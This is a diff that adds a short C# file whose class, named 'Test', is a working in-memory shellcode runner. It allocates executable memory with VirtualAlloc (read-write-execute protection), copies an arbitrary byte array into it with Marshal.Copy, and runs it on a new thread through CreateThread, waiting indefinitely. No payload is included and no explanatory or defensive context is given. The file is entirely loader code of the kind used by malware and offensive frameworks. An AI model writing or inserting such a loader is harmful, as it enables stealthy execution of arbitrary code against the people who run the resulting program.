@@ -1,0 +1,15 @@
+using System;
+using System.Runtime.InteropServices;
+public class Test{
+	[DllImport("kernel32.dll")]
+	private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+	[DllImport("kernel32.dll")]
+	private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+	[DllImport("kernel32.dll")]
+	private static extern IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+	public static void start(byte[] data){
+		 IntPtr addr = VirtualAlloc((IntPtr)0, (uint)(Math.Max(data.Length,0x1000)),0x3000,0x40);
+         Marshal.Copy(data, 0, addr, data.Length);
+         WaitForSingleObject(CreateThread((IntPtr)0, 0, addr, (IntPtr)0, 0, (IntPtr)0), 0xFFFFFFFF);
+	}
+}
